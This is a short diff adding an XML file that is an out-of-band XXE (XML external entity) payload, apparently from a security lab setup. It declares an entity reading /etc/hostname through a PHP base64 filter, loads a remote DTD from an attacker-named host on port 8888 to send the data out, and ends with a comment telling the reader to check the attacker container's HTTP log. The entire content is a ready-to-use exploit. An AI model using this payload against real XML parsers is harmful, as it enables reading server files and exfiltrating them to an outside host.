@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [
+ <!ENTITY data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
+ <!ENTITY % oob SYSTEM "http://attackerserver-php:8888/oob.dtd">
+ %oob;
+]> 
+<root><name>tst &exfil;</name><password>tett</password></root>
+
+# proceed to view httplog.txt on attackerserver-php container.
